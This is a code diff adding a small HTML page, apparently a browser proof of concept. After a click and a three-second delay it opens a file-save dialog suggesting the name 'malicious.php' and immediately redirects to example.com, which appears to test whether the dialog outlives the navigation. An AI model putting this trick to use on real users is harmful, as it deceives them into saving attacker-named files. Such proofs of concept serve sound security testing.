@@ -1,0 +1,54 @@
+  <!DOCTYPE html>
+  <html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Delayed File Save Picker</title>
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        font-family: sans-serif;
+        background-color: #f0f2f5;
+        cursor: pointer;
+        user-select: none;
+      }
+      h1 {
+        color: black;
+        text-align: center;
+        max-width: 600px;
+        padding: 20px;
+        border: 2px dashed gray;
+        background-color: #fff;
+      }
+      p {
+        margin-top: 20px;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Click any where</h1>
+
+    <script>
+    document.addEventListener('click', () => {
+      setTimeout(() => {
+
+        // PANGGIL tanpa await
+        window.showSaveFilePicker({
+          suggestedName: 'malicious.php'
+        }).catch(()=>{});
+
+        // redirect cepat
+        setTimeout(() => {
+          window.location.href = 'https://example.com';
+        }, 0);
+
+      }, 3000);
+    }, { once: true });
+    </script>
+  </body>
+  </html>
